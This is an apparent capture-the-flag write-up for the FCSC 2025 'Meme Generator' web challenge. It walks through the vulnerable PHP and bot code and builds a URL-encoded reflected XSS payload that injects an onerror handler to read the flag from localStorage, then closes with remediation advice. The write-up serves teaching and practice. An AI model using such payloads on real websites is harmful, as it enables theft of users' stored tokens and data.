# Meme Generator

**Link:** [https://hackropole.fr/fr/challenges/web/fcsc2025-web-meme-generator/](https://hackropole.fr/fr/challenges/web/fcsc2025-web-meme-generator/)

**Category:** ![](https://img.shields.io/badge/web-3776AB)

**Difficulty:** intro

**Description:** This web application is vulnerable to a very classic technique. The bot accessible via the service holds the flag in its `localStorage`.

- Web Application : [https://meme-generator.fcsc.fr/](https://meme-generator.fcsc.fr/)
- Bot: `nc chall.fcsc.fr 2210` (bot has no internet access)

The source code is available in the folder `meme-generator`.

# TL;DR

The challenge involves exploiting a reflected XSS vulnerability in the `src` attribute of an `img` tag, allowing JavaScript injection to access `localStorage` and retrieve the flag.

# Solution

### Code review

![image](https://github.com/user-attachments/assets/ed1213d2-2890-4ae0-8c38-6773b3180cfd)

The `docker-compose.yml` defines two services: one for the web application and another for the bot.

By inspecting `bot.js`, we find that the flag is stored in the bot's `localStorage`, and we can submit any URL that the bot will visit. Every `console.log` output from the bot is sent back to us.

```jsx
/* ** CHALLENGE LOGIC ** */
const page = await browser.newPage();
await page.setDefaultNavigationTimeout(5000);

logMainInfo(`Setting the flag in the localStorage for ${CHALLENGE_HOST}...`);
await page.goto(CHALLENGE_HOST, { timeout: 1000, waitUntil: "domcontentloaded" });

await page.evaluate((flag) => {
  localStorage.setItem("flag", flag);
}, FLAG);

logMainInfo(`Going to the user provided link...`);
try {
  await page.goto(url);
} catch (e) {
}
await delay(3000);
```

Now looking at the web app code:

```php
<?php if (isset($_GET['image']) && isset($_GET['text'])): ?>
<div class="meme-container">
  <img src="img/<?php echo $_GET['image']; ?>" class="img-fluid">
  <div class="meme-text"><?php echo strtoupper($_GET['text']); ?></div>
</div>
<?php endif; ?>
```

The application takes two query parameters, `image` and `text`, both of which are reflected in the response:

- `text`: is reflected inside a `div` tag, but is converted to uppercase, making it seemingly impossible to inject characters like `<` and `>`.
- `image`: is reflected directly into the `src` attribute of an `img` tag without any sanitization, making it **vulnerable to reflected XSS**.

### Crafting the payload

Our goal is to create the following `img` tag:

```html
<img src="img/x" onerror="console.log(localStorage.getItem('flag'))" class="img-fluid">
```

Here, `x` is any invalid image path, so that the image fails to load and the `onerror` script executes, logging the flag to the console.

Since both parameters are required, the final payload looks like this:

`http://meme-generator/?image=x%22%20onerror=%22console.log(localStorage.getItem(%27flag%27))&text=`

We send this payload to the bot and receive the flag in the console output:

![image 1](https://github.com/user-attachments/assets/a53bd090-5e21-4b13-a987-49566624cb12)

# Remediation

- Encode outputs using HTML entity encoding.
- Sanitize user input to restrict it to expected characters where applicable.
